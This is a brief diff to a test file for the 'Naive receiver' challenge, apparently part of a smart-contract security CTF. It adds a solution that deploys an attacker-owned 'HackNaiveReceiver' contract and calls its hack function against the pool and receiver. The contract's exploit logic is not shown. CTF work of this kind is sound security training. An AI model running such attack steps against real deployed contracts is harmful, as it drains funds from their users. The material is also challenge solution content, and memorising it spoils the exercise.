@@ -32,6 +32,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const HackNaiveReceiver = contract.fromArtifact('HackNaiveReceiver');
+        const hackContract = await HackNaiveReceiver.new({ from: attacker });
+        await hackContract.hack(this.pool.address, this.receiver.address);
+
     });
 
     after(async function () {
